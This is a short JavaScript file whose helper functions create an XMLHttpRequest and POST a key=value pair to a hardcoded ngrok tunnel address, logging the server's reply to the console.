function ajaxRequest() {
	try {
		var request = new XMLHttpRequest();
	} catch(e1) {
		alert("Error! Issue with creaating XMLHttpRequest!");
	}
	return request
}

function transmit(key, value) {
	var params = key + "=" + value;
	var request = new ajaxRequest();	

	request.open("POST", "http://9d25b2c1eb23.ngrok.io/post", true) // NEEDS URL!
	request.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	request.setRequestHeader("Content-length", params.length)
	request.setRequestHeader("Connection", "keep-alive")

	request.onreadystatechange = function() {
		if (this.readyState == 4) {
			if (this.status == 200) {
				if (this.responseText != null) {
					console.log("Ajax success: " + this.responseText)
				} else {
					console.log("Ajax error: No data receieved.")
				}
			} else {
				console.log("Ajack error: " + this.statusText)
			}
		} 
	}
	request.send(params)
}